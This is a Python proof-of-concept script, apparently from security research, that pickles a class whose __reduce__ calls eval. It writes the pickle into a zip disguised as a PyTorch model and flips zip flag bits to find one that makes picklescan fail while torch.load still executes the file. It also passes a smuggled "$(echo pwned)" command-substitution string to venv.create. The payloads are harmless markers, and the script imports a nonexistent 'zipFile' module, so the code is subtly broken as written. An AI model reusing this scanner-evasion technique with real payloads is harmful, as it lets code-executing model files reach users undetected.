import os
import pickle
import venv

import zipFile
import torch
from picklescan import cli

def can_scan(zip_file):
    try:
        cli.print_summary(False,cli.scan_file_path(zip_file))
        return True
    except Exception:
        return False


bit_to_flip = 0x1
# bit_to_flip = 0x20
# bit_to_flip = 0x40
venv.create('venv', False, False, True, False, "$(echo pwned)")
class Malicious1:
    def __reduce__(self):
        return eval, ("print('456')",)


# zip_file = "model.pth"
model = Malicious1()
# torch.save(model, zip_file)

# with zipFile.ZipFile(zip_file, "r") as source:
flipped_name = f"malicious1_{bit_to_flip}.zip"

with zipFile.ZipFile(flipped_name, "w") as dest:
    bad_file = zipFile.ZipInfo("model/config.pkl")

    # Here is the magic
    bad_file.flag_bits |= bit_to_flip

    dest.writestr(bad_file, pickle.dumps(model))
    # for item in source.infolist():
    #     dest.writestr(item, source.read(item.filename))

    print(f"File written to {flipped_name}")
#
# if model == torch.load(flipped_name, weights_only=False):
#     if not can_scan(flipped_name):
#         print('Found exploitable bit:', bit_to_flip)
# else:
#     os.remove(flipped_name)